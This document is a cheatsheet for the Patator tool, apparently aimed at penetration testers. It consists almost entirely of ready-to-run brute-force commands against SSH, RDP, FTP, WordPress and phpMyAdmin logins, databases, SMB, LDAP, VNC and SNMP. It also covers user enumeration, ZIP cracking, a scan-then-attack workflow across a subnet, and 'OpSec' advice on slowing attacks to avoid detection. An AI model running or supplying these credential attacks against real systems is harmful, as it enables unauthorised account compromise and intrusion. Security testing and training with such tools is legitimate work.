# Patator Cheatsheet

## Quick Reference

### SSH Brute Force

```bash
# Single user, password list
patator ssh_login host=192.168.1.100 user=root password=FILE0 0=/usr/share/wordlists/rockyou.txt

# User list, password list
patator ssh_login host=192.168.1.100 user=FILE0 0=usernames.txt password=FILE1 1=passwords.txt

# With exclusion rules
patator ssh_login host=192.168.1.100 user=root password=FILE0 0=passwords.txt -x ignore:mesg='Authentication failed.'
```

### RDP Brute Force

```bash
patator rdp_login host=192.168.1.100 user=FILE0 0=usernames.txt password=FILE1 1=passwords.txt
```

### FTP Brute Force

```bash
patator ftp_login host=192.168.1.100 user=FILE0 0=usernames.txt password=FILE1 1=passwords.txt
```

### HTTP POST Form

```bash
# Basic login form
patator http_fuzz url=http://192.168.1.100/login.php method=POST body='user=COMBO00&pass=COMBO01' 0=combos.txt -x ignore:fgrep='Invalid credentials'

# WordPress
patator http_fuzz url=http://192.168.1.100/wp-login.php method=POST body='log=COMBO00&pwd=COMBO01&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1' 0=combos.txt -x ignore:fgrep='Invalid username'

# phpMyAdmin
patator http_fuzz url=http://192.168.1.100/phpmyadmin/index.php method=POST body='pma_username=COMBO00&pma_password=COMBO01&server=1&target=index.php' 0=combos.txt -x ignore:fgrep='Cannot log in to the MySQL server'
```

### MySQL Brute Force

```bash
patator mysql_login host=192.168.1.100 user=root password=FILE0 0=passwords.txt
```

### MSSQL Brute Force

```bash
patator mssql_login host=192.168.1.100 user=sa password=FILE0 0=passwords.txt
```

### PostgreSQL Brute Force

```bash
patator pgsql_login host=192.168.1.100 user=postgres password=FILE0 0=passwords.txt
```

### SMB Brute Force

```bash
patator smb_login host=192.168.1.100 user=FILE0 0=usernames.txt password=FILE1 1=passwords.txt
```

### LDAP Brute Force

```bash
patator ldap_login host=192.168.1.100 user=FILE0 0=usernames.txt password=FILE1 1=passwords.txt
```

### VNC Brute Force

```bash
patator vnc_login host=192.168.1.100 password=FILE0 0=passwords.txt
```

### SNMP Brute Force

```bash
patator snmp_login host=192.168.1.100 community=FILE0 0=passwords.txt
```

### DNS Brute Force

```bash
# Forward lookup
patator dns_forward name=FILE0.example.com 0=names.txt -x ignore:code=3

# Reverse lookup
patator dns_reverse host=NET0 0=192.168.1.0/24 -x ignore:code=3
```

### SMTP User Enumeration

```bash
# VRFY command
patator smtp_vrfy host=192.168.1.100 user=FILE0 0=usernames.txt

# RCPT TO command
patator smtp_rcpt host=192.168.1.100 user=FILE0 0=usernames.txt
```

### Finger User Enumeration

```bash
patator finger_lookup host=192.168.1.100 user=FILE0 0=usernames.txt
```

### ZIP Password Cracking

```bash
patator unzip_pass zipfile=encrypted.zip password=FILE0 0=rockyou.txt -x ignore:code!=0
```

### Combo File Attack

```bash
# Create combo file (user:pass)
echo "admin:password123" > combos.txt
echo "root:toor" >> combos.txt

# Attack with combo file
patator ssh_login host=192.168.1.100 user=COMBO00 password=COMBO01 0=combos.txt
```

### Resume Interrupted Attack

```bash
patator ssh_login host=192.168.1.100 user=root password=FILE0 0=passwords.txt --resume 15,15,15,16,15,36,15,16,15,40
```

### Logging

```bash
patator ssh_login host=192.168.1.100 user=root password=FILE0 0=passwords.txt -l /tmp/patator_logs
```

## Command Options

| Option | Description |
|--------|-------------|
| `MODULE` | Attack module to use |
| `key=value` | Module-specific parameters |
| `-x key:val` | Exclude rules |
| `-l LOG` | Log directory |
| `--resume STATE` | Resume from previous state |
| `--timeout SECS` | Connection timeout |
| `--max-retries NUM` | Maximum retry attempts |
| `-t THREADS` | Number of threads |

## Exclusion Rules

| Rule | Description |
|------|-------------|
| `ignore:mesg='text'` | Ignore specific message |
| `ignore:code=401` | Ignore specific code |
| `ignore:fgrep='pattern'` | Ignore by grep pattern |
| `ignore:time=0-3` | Ignore by time range |
| `ignore,reset,retry:code=500` | Ignore, reset, retry |

## Supported Modules

| Module | Description |
|--------|-------------|
| `ssh_login` | SSH brute force |
| `rdp_login` | RDP brute force |
| `ftp_login` | FTP brute force |
| `telnet_login` | Telnet brute force |
| `http_fuzz` | HTTP/HTTPS brute force |
| `mysql_login` | MySQL brute force |
| `mssql_login` | MSSQL brute force |
| `pgsql_login` | PostgreSQL brute force |
| `oracle_login` | Oracle brute force |
| `smb_login` | SMB brute force |
| `ldap_login` | LDAP brute force |
| `vnc_login` | VNC brute force |
| `snmp_login` | SNMP brute force |
| `smtp_vrfy` | SMTP user enumeration |
| `smtp_rcpt` | SMTP user enumeration |
| `finger_lookup` | Finger user enumeration |
| `dns_forward` | DNS forward lookup |
| `dns_reverse` | DNS reverse lookup |
| `ike_enum` | IKE enumeration |
| `unzip_pass` | ZIP password cracking |

## Common Workflows

### Discover and Attack

```bash
# 1. Find services
nmap -p 22,80,445,3306,3389 --open 192.168.1.0/24 -oG - > services.txt

# 2. Extract targets per service
grep "22/open" services.txt | awk '{print $2}' > ssh_hosts.txt

# 3. Brute force
patator ssh_login host=FILE0 0=ssh_hosts.txt user=root password=FILE1 1=passwords.txt
```

### Combo File Attack

```bash
# Create combo file
echo "admin:password123" > combos.txt
echo "root:toor" >> combos.txt

# Attack with combo file
patator ssh_login host=192.168.1.100 user=COMBO00 password=COMBO01 0=combos.txt
```

### Multi-Service Attack

```bash
patator ssh_login host=192.168.1.100 user=root password=FILE0 0=passwords.txt &
patator ftp_login host=192.168.1.100 user=admin password=FILE0 0=passwords.txt &
wait
```

## Troubleshooting

### Common Errors

**"Connection refused"**:
```bash
nmap -p 22 192.168.1.100
ssh root@192.168.1.100
```

**"False positives"**:
```bash
patator ssh_login host=192.168.1.100 user=root password=FILE0 0=passwords.txt -x ignore:mesg='Authentication failed.'
```

**"Slow performance"**:
```bash
patator ssh_login host=192.168.1.100 user=root password=FILE0 0=passwords.txt -t 10 --timeout 5
```

## OpSec Tips

1. **Use exclusion rules**: Avoid false positives with `-x`
2. **Reduce threads**: Use `-t 1` for stealth
3. **Add timeout**: Use `--timeout 10` to slow down
4. **Log everything**: Use `-l` for audit trail

## Resources

- **GitHub**: https://github.com/lanjelot/patator
- **Kali Docs**: https://www.kali.org/tools/patator/
- **Wiki**: https://github.com/lanjelot/patator/wiki
